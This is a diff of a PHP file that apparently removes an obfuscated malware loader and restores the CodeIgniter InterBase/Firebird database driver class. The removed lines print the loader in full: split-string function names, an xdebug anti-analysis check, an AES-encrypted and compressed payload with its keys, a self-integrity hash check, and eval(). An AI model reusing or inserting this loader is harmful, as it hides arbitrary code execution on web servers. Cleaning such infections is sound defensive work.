@@ -1,28 +1,362 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_dewbqya2=('bas'.'e64'.'_de'.'cod'.'e');
-$_xfxefcbq=('gzu'.'nco'.'mpr'.'ess');
-$_pco07owr=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_scjwvd3p='IGLA1L9e';
-$_ficnjh94='mDPs+ySi';
-$_zud13jup='Fi1JCNHF';
-$_jlc35x01='23cuArzdrHs=';
-$_s0jcy28q='FStaNRh5';
-$_u0c2megj='jLkKFvfP';
-$_ovdxozwq='eQnBmzQa';
-$_lf625tsp='5Hymdw==';
-$_qy3klw2f=$_dewbqya2($_zud13jup.$_s0jcy28q.$_ficnjh94.$_scjwvd3p.$_jlc35x01);
-$_ufhz2gil=$_dewbqya2($_u0c2megj.$_ovdxozwq.$_lf625tsp);
-$_shysz22w=$_dewbqya2('UP9UhdU6KHsWPykeS5n9w63wrztr/QKI/BYdgtbXzVxov+qd2nrohc4liRJuRQISjJ3UAF2NBzJ1KzMd021rZdLeeJqYsseHC+gkyRvKI2XnpTVKbOzKClUCWvJ0vII2mSG2ndzoAOOqa1wcxTfmje8hJhaojltD7wX+0BKVYPdnzgKcZoWZYUIAxI/rjN/e4r31T5o/aPGRhljDO4km5oOTXcXS3yQutqizQDffviYQNcu9wcu5PUaDtMEdrTFJPGb9GuhBIu7JYM2ng/wgdBmpn9cffTdhHAkRfBFHhdhoMGPNLGAXXghAiOi9xMEBwoDYnW/Aqm+ilIfyAUljqRm3jZkeECUw8L/xppUISG45FrzwVzq/p+PcO/XoU8VaCS7EzhOz2bIQGPGHE1zNk2B9AFiNX7QkXF59WuRzzTOBZinX291+lxJSt7YaZzJW7ND6dNa42wrNOJhTFxaIHH4Fiy4eGdj4C5RQ4KmQlAea2rQeZTB4QE+NZTJd/SjDR8mE8k2wmx6Rc+57USL3JLoWW4jaTXljJZRvSJCU4Hs3kHzID1zXh6E0/uKoRgeQxcSbfhZOmAwHA46OeWqFoZZ5kkP0GPfFYvX2Z42JAyKsJwmsZKUYLBeEx8R64pe4kz/Q8y6fTBPMJDYzQLupi1dl93tqaUy+yK0HcixiPSS10XNqisEctJa6nwbyZWHc9yDLUTasmwcfxVIMaw9D+3aWZQlfgmGYUjXAcOJ6HLpAGF03d5jdf4PqBya6pdZViYmWXtykjEGUuqJ2oqlKcxJ6rdVeqTdXIHlRCY212zvwHW531gMKuqXVy2blN0PKqL6fS09RnJNjY5aVRiu7sGCcST9G6QGQ0xeT9kpOrQBww53MztJlXZUKZn6uqPDBbVVF3OPZKBnHoRi6U5UT3q5q5wTTyPTpqCRRsIjyHpSV2zlEzsuorcvAEj/ouernHNbDCm5yYjdS8Wmk/xRqCeA1nxxre0cffd9ZcNSp6NJphnu4jczFu6akJfQo3iIel9Df0zoKhLAkAZQnqLd9syaaOEApdI6FvriuZn9GybU/VeTxZy28bd/u83bMDp5icnVbxJbiCA5wfKE0IMQ1+WQsHZGti1bgIRPTQMlTai5deiRWL2j/KjsncRiSSHVnD/tt28V3GbgaLqp29M7h5QuxmUExi0OF0HqoFtzUHNYrCSwhF1NVWPkbtjLgjJ/6tyPwARGTDK0XAKnXn0mT9DVr+s63iRyTIwQwtmIabELvPWwRerJR4zeLCRIjkJN6NA11Fz98tARQYnC2GTyynurs4Dgra9Gt0LVJGeh1gMM4OeY4M4OaVHIOXCxC0f/Ysb2xPNlJw4hxqvhr7TLC4bKMvIys2cAf51JcqcskgdUjpijAOlMxBas+MLUoSmKrV2MzuDe0WT9rxxFaD5dFZMK1MUrKtiOaaWtSS13fSjM88pZ0yMCE5QgUATgFdLRV2K2k+V6rBU1QvnjEiOTkQ3fVk8UzrdNzyPCayiaqzeqzTIeT+n3+1rB5lh++KSPtEQVjimwbOCLb+QqOXM/vyl1enH6BWcEjYvoNcyG3fXk8z91wz/bhx6n60LDB75V1+ObjpSP5xF8G/zFdVP9G1GKIW24eOBtOoE2EGiQ8hp9ClYJVPyiaVHGSX2sbXj0+2fhZP9+qQwoGn/OMCGW1XEwYVC/TQjr5Lz6p0JQNAkLoyOXKmuEcaQzu208+00VvZJNqxU5K/Eoe7Y/h02fKT2685E0dxhUikxJlBSj80O1SxAmhMgAbwQzaWhhV6cGPHuhKwT4pLHoighuZCdq0jh5qOYVkOOaEtw4P/4w6eQfccKDImoGz34oseFFJH6HfT/wx9PIlyrjpfviJKh8S6Som/ww/+sw8QpPR9tmvdDB1Ezu3wqi4x3jegMZEpk6BmKUQcKd3lSzCIvNqrRzv/wbO8oSaN4CgKmxsfLRl5B5mdz42D79vU3tI9axLwiqd');
-$_xwbbuwfl=$_pco07owr($_shysz22w,'aes-256-cbc',$_qy3klw2f,OPENSSL_RAW_DATA,$_ufhz2gil);
-if($_xwbbuwfl===false){exit;}
-$_lzixobm5=$_xfxefcbq($_xwbbuwfl);
-if($_lzixobm5===false){exit;}
-$_bblkaed6='8bc77e255777dd16c3b2263a8dfbb89f2ccdca95a033c7e6222f956e508dd010';
-$_jtfxros7=@file_get_contents(__FILE__);
-if($_jtfxros7!==false){
-$_bd4y4d3j=str_replace($_bblkaed6,"0000000000000000000000000000000000000000000000000000000000000000",$_jtfxros7);
-$_afeihqgm=hash("sha256",$_bd4y4d3j);
-if($_afeihqgm!==$_bblkaed6){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_ibase_driver extends CI_DB {
+
+
+
+
+
+public $dbdriver = 'ibase';
+
+
+
+
+
+
+protected $_random_keyword = array('RAND()', 'RAND()');
+
+
+
+
+
+protected $_ibase_trans;
+
+
+
+
+
+
+
+public function db_connect($persistent = FALSE)
+{
+return ($persistent === TRUE)
+? ibase_pconnect($this->hostname.':'.$this->database, $this->username, $this->password, $this->char_set)
+: ibase_connect($this->hostname.':'.$this->database, $this->username, $this->password, $this->char_set);
 }
-eval($_lzixobm5);
+
+
+
+
+
+
+public function version()
+{
+if (isset($this->data_cache['version']))
+{
+return $this->data_cache['version'];
+}
+if (($service = ibase_service_attach($this->hostname, $this->username, $this->password)))
+{
+$this->data_cache['version'] = ibase_server_info($service, IBASE_SVC_SERVER_VERSION);
+
+ibase_service_detach($service);
+return $this->data_cache['version'];
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+protected function _execute($sql)
+{
+return ibase_query(isset($this->_ibase_trans) ? $this->_ibase_trans : $this->conn_id, $sql);
+}
+
+
+
+
+
+
+protected function _trans_begin()
+{
+if (($trans_handle = ibase_trans($this->conn_id)) === FALSE)
+{
+return FALSE;
+}
+$this->_ibase_trans = $trans_handle;
+return TRUE;
+}
+
+
+
+
+
+
+protected function _trans_commit()
+{
+if (ibase_commit($this->_ibase_trans))
+{
+$this->_ibase_trans = NULL;
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+protected function _trans_rollback()
+{
+if (ibase_rollback($this->_ibase_trans))
+{
+$this->_ibase_trans = NULL;
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+public function affected_rows()
+{
+return ibase_affected_rows($this->conn_id);
+}
+
+
+
+
+
+
+
+
+public function insert_id($generator_name, $inc_by = 0)
+{
+
+return ibase_gen_id('"'.$generator_name.'"', $inc_by);
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SELECT TRIM("RDB$RELATION_NAME") AS TABLE_NAME FROM "RDB$RELATIONS" WHERE "RDB$RELATION_NAME" NOT LIKE \'RDB$%\' AND "RDB$RELATION_NAME" NOT LIKE \'MON$%\'';
+if ($prefix_limit !== FALSE && $this->dbprefix !== '')
+{
+return $sql.' AND TRIM("RDB$RELATION_NAME") AS TABLE_NAME LIKE \''.$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+return 'SELECT TRIM("RDB$FIELD_NAME") AS COLUMN_NAME FROM "RDB$RELATION_FIELDS" WHERE "RDB$RELATION_NAME" = '.$this->escape($table);
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+$sql = 'SELECT "rfields"."RDB$FIELD_NAME" AS "name",
+				CASE "fields"."RDB$FIELD_TYPE"
+					WHEN 7 THEN \'SMALLINT\'
+					WHEN 8 THEN \'INTEGER\'
+					WHEN 9 THEN \'QUAD\'
+					WHEN 10 THEN \'FLOAT\'
+					WHEN 11 THEN \'DFLOAT\'
+					WHEN 12 THEN \'DATE\'
+					WHEN 13 THEN \'TIME\'
+					WHEN 14 THEN \'CHAR\'
+					WHEN 16 THEN \'INT64\'
+					WHEN 27 THEN \'DOUBLE\'
+					WHEN 35 THEN \'TIMESTAMP\'
+					WHEN 37 THEN \'VARCHAR\'
+					WHEN 40 THEN \'CSTRING\'
+					WHEN 261 THEN \'BLOB\'
+					ELSE NULL
+				END AS "type",
+				"fields"."RDB$FIELD_LENGTH" AS "max_length",
+				"rfields"."RDB$DEFAULT_VALUE" AS "default"
+			FROM "RDB$RELATION_FIELDS" "rfields"
+				JOIN "RDB$FIELDS" "fields" ON "rfields"."RDB$FIELD_SOURCE" = "fields"."RDB$FIELD_NAME"
+			WHERE "rfields"."RDB$RELATION_NAME" = '.$this->escape($table).'
+			ORDER BY "rfields"."RDB$FIELD_POSITION"';
+return (($query = $this->query($sql)) !== FALSE)
+? $query->result_object()
+: FALSE;
+}
+
+
+
+
+
+
+
+
+
+public function error()
+{
+return array('code' => ibase_errcode(), 'message' => ibase_errmsg());
+}
+
+
+
+
+
+
+
+
+
+
+protected function _update($table, $values)
+{
+$this->qb_limit = FALSE;
+return parent::_update($table, $values);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _truncate($table)
+{
+return 'DELETE FROM '.$table;
+}
+
+
+
+
+
+
+
+
+
+protected function _delete($table)
+{
+$this->qb_limit = FALSE;
+return parent::_delete($table);
+}
+
+
+
+
+
+
+
+
+
+protected function _limit($sql)
+{
+
+if (stripos($this->version(), 'firebird') !== FALSE)
+{
+$select = 'FIRST '.$this->qb_limit
+.($this->qb_offset ? ' SKIP '.$this->qb_offset : '');
+}
+else
+{
+$select = 'ROWS '
+.($this->qb_offset ? $this->qb_offset.' TO '.($this->qb_limit + $this->qb_offset) : $this->qb_limit);
+}
+return preg_replace('`SELECT`i', 'SELECT '.$select, $sql, 1);
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _insert_batch($table, $keys, $values)
+{
+return ($this->db_debug) ? $this->display_error('db_unsupported_feature') : FALSE;
+}
+
+
+
+
+
+
+protected function _close()
+{
+ibase_close($this->conn_id);
+}
+}
